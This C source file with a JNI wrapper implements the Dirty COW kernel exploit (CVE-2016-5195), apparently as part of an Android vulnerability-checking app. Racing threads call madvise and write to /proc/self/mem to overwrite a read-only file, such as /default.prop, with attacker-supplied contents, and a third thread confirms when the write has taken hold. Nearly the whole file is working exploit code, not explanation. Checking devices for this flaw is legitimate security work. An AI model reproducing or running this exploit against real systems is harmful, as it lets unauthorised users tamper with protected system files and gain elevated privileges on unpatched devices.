#include <err.h>
#include <stdio.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <jni.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "DirtyCOW", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

#define LOOP 50000
#define STRINGSIZE 200

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct mem_arg  {
	unsigned char *offset;
	unsigned char *patch;
	size_t patch_size;
    const char *oldFilePath;
    uint8_t isWritten;
    uint8_t doneWriting;
    pthread_cond_t condWritten;
    pthread_mutex_t lock;
};

// enum defining the Error codes for JNI
typedef enum EerrorCode{
    success = 0,
    cantOpenFile,
    cantMap,
    wrongParamater
} errorCode;


static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int c = 0;

	mem_arg = (struct mem_arg *)arg;
	size = mem_arg->patch_size;
	addr = (void *)(mem_arg->offset);

	LOGV("[*] madvise = %p %d", addr, (int)size);

	while (mem_arg->doneWriting == 0) {
		c += madvise(addr, size, MADV_DONTNEED);
	}
	LOGV("[*] madvise = %d", c);
	return 0;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;

	mem_arg = (struct mem_arg *)arg;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		LOGV("open(\"/proc/self/mem\"");
	for (i = 0; i < LOOP && (mem_arg->isWritten == 0); i++) {
        lseek(fd, (off_t) mem_arg->offset, SEEK_SET);
        c += write(fd, mem_arg->patch, mem_arg->patch_size);
        pthread_cond_signal(&mem_arg->condWritten);
    }
    mem_arg->doneWriting = 1;
	LOGV("[*] /proc/self/mem %d %i", c, i);
	close(fd);
	return NULL;
}

static void *checkWriteThread(void *arg)
{
    struct mem_arg *mem_arg;
    int fd, c = 0;
    char buffer[STRINGSIZE];

    mem_arg = (struct mem_arg *)arg;

    while (mem_arg->doneWriting == 0) {
        pthread_mutex_lock(&mem_arg->lock);
        pthread_cond_wait(&mem_arg->condWritten, &mem_arg->lock);
        pthread_mutex_unlock(&mem_arg->lock);
        fd = open(mem_arg->oldFilePath, O_RDONLY);
        if (fd == -1)
            LOGV("open(\"oldFile for check");
        c += read(fd, buffer, mem_arg->patch_size);
        if (strncmp((const char *)buffer, (const char *)mem_arg->patch, mem_arg->patch_size) == 0){
            mem_arg->isWritten = 1;
            break;
        }
        close(fd);
        sched_yield();
    }
    LOGV("[*] oldFile check c: %d buffer: \"%s\" patch: \"%s\"", c, buffer, mem_arg->patch);
    return NULL;
}

static void exploit(struct mem_arg *mem_arg)
{
	pthread_t pthMadVise, pthProcSelfMem, pthCheckWrite;

	LOGV("[*] exploit (%s) unpatch");
	LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);

	pthread_create(&pthMadVise, NULL, madviseThread, mem_arg);
	pthread_create(&pthProcSelfMem, NULL, procselfmemThread, mem_arg);
    pthread_create(&pthCheckWrite, NULL, checkWriteThread, mem_arg);

	pthread_join(pthMadVise, NULL);
	pthread_join(pthProcSelfMem, NULL);
    pthread_join(pthCheckWrite, NULL);

	LOGV("[*] exploited %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
}

errorCode callCow(int argc, const char *argv[])
{
	if (argc < 2/* && arg > 2 */) {
		LOGV("usage %s /default.prop /data/local/tmp/default.prop", argv[0]);
		return wrongParamater;
	}

	struct mem_arg mem_arg;
	struct stat st_oldFile;
	struct stat st_newFile;

	int oldFile=open(argv[0],O_RDONLY);
	if (oldFile == -1) {
		LOGV("could not open %s", argv[0]);
		return cantOpenFile;
	}
	if (fstat(oldFile,&st_oldFile) == -1) {
		LOGV("could not open %s", argv[0]);
        close(oldFile);
		return cantOpenFile;
	}
	int newFile=open(argv[1],O_RDONLY);
	if (newFile == -1) {
		LOGV("could not open %s", argv[1]);
        close(oldFile);
		return cantOpenFile;
	}
	if (fstat(newFile,&st_newFile) == -1) {
		LOGV("could not open %s", argv[1]);
        close(oldFile);
        close(newFile);
		return cantOpenFile;
	}
	size_t size = st_oldFile.st_size;
	if (st_newFile.st_size != st_oldFile.st_size) {
		LOGV("warning: new file size (%lld) and file old size (%lld) differ\n", st_newFile.st_size, st_oldFile.st_size);
		if (st_newFile.st_size > size) {
			size = st_newFile.st_size;
		}
	}

	LOGV("size %d\n\n",size);

	mem_arg.patch = malloc(size);
	if (mem_arg.patch == NULL)
		LOGV("malloc");

	memset(mem_arg.patch, 0, size);

	read(newFile, mem_arg.patch, st_newFile.st_size);
	close(newFile);
	mem_arg.patch_size = size;
    void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, oldFile, 0);
	if (map == MAP_FAILED) {
		LOGV("mmap");
        close(oldFile);
		return cantMap;
	}

	LOGV("[*] mmap %p", map);

	mem_arg.offset = map;
    mem_arg.oldFilePath = argv[0];
    mem_arg.isWritten = 0;
    mem_arg.doneWriting = 0;
    pthread_mutex_init(&mem_arg.lock, NULL);
    pthread_cond_init(&mem_arg.condWritten, NULL);

	exploit(&mem_arg);

    pthread_cond_destroy(&mem_arg.condWritten);
    pthread_mutex_destroy(&mem_arg.lock);
    munmap(map, size);
	close(oldFile);
    free(mem_arg.patch);

	return success;
}

JNIEXPORT jint JNICALL
Java_fuzion24_device_vulnerability_vulnerabilities_kernel_CVE_12016_15195_runDirtyCow(JNIEnv *env, jobject obj, jobjectArray stringArray){
    int stringCount = (*env)->GetArrayLength(env, stringArray);
    char src[STRINGSIZE];
    char dest[STRINGSIZE];
	const char *argv[2];
    jstring string[2];
    argv[0] = dest;
    argv[1] = src;
    errorCode error;
    for (int i=0; i < stringCount; i++)
    {
        string[i] = (*env)->GetObjectArrayElement(env, stringArray, i);
        argv[i] = (*env)->GetStringUTFChars(env, string[i], 0);
    }
    error = callCow(stringCount, argv);
    for (int i = 0; i < stringCount; i++) {
        (*env)->ReleaseStringUTFChars(env, string[i], argv[i]);
        (*env)->DeleteLocalRef(env, string[i]);
    }
    return (jint)error;
}
